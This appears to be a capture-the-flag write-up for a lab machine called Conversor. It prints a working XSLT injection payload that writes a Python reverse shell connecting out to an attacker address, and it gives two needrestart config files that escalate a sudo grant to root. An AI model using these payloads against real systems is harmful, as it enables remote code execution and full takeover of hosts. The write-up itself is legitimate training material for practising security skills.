Enumeration

We start with casual enumeration and find that ports 22 and 80 are open.

sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.11.92

After this, we register a new account to log in to the web server.

We can see that it converts XML and XSLT files.

We can find and download an XSLT template.

We can navigate to /about and then download the source code too.

If we read app.py inside the source folder, we can see some important information, like where users.db is and that the database uses sqlite3.

Foothold

The next important piece of information is in install.md. The last line of this file says this:

* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done

This means that every minute, any .py file inside the /var/www/conversor.htb/scripts/ folder is executed by www-data. So we need to find a way to write a .py file inside the /scripts folder to get it executed and gain RCE.

First, we create a legitimate nmap .xml file so we can upload it.

nmap -p 22,80 -sC -sV -oA conv 10.10.11.92

Then we upload the default .xslt template that is provided to us, just to check how it functions and to check the traffic through Burp.

We can see that the file is uploaded. Now we want to upload a new one, and by uploading it, we create the malicious .py file at the same time.

<?xml version="1.0" encoding="UTF-8"?> <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exploit="http://exslt.org/common" extension-element-prefixes="exploit" version="1.0"> <xsl:template match="/"> <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text"> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.19",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh") </exploit:document> </xsl:template> </xsl:stylesheet>

Before we upload the proper Python script, we open our listener. Then we can upload and click the .html file that was created. We wait for a minute and we can see that we got the shell.

Privilege Escalation

After connecting to the server with SSH, I can see that running sudo -l gives this response.

(ALL : ALL) NOPASSWD: /usr/sbin/needrestart

If we check the version of needrestart, we can see it is 3.7.

There is also a write-up that explains how to use this vulnerability for privilege escalation.

https://medium.com/@aniketdas07770/abusing-sudo-rights-on-needrestart-for-escalation-d1307c2af12f

We create a new .conf file. Because we have sudo privileges, we can copy the /bin/bash file (executed by root) to the /tmp directory and set it executable for any user.

system("cp /bin/bash /tmp/; chmod u+s /tmp/bash")

Then we execute it.

sudo needrestart -c cmd.conf

We can see that bash is copied to our /tmp directory. We can open a root session with this:

./bash -p

Here we get the root flag.

Root Flag [REDACTED]

This is a different .conf file to get privilege escalation.

cat > /tmp/exploit.conf << 'EOF' BEGIN { system("/bin/sh") } [needrestart] EOF

After creating it, we use this command again:

sudo needrestart -c exploit.conf
